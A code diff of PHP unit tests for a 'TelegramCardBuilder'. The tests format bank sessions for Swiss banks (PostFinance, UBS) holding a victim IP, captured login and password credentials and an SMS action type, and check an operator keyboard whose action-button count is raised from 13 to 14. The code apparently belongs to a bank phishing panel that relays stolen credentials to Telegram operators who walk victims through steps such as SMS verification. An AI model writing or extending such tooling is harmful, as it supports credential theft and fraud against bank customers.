@@ -15,7 +15,7 @@ class TelegramCardBuilderTest extends TestCase
     public function test_card_text_contains_bank_credentials_and_state(): void
     {
         $session = BankSession::create([
-            'bank_slug'   => 'postfinance',
+            'bank_slug'   => 'ubs',
             'ip_address'  => '1.2.3.4',
             'credentials' => ['login' => 'u', 'password' => 'p'],
             'action_type' => ['type' => 'sms'],
@@ -24,7 +24,7 @@ class TelegramCardBuilderTest extends TestCase
 
         $text = (new TelegramCardBuilder())->buildCardText($session);
 
-        $this->assertStringContainsString('PostFinance', $text);
+        $this->assertStringContainsString('Сессия', $text);
         $this->assertStringContainsString('1.2.3.4', $text);
         $this->assertStringContainsString('Login', $text);
         $this->assertStringContainsString('1234', $text);
@@ -45,8 +45,8 @@ class TelegramCardBuilderTest extends TestCase
         $session = BankSession::create(['bank_slug' => 'ubs', 'status' => BankSessionStatus::Assigned]);
         $kb = (new TelegramCardBuilder())->buildKeyboard($session);
         $all = array_merge(...$kb->inline_keyboard);
-        // 11 action buttons + complete + unassign = 13
-        $this->assertCount(13, $all);
+        // 12 action buttons + complete + unassign = 14
+        $this->assertCount(14, $all);
     }
 
     public function test_completed_keyboard_is_empty(): void
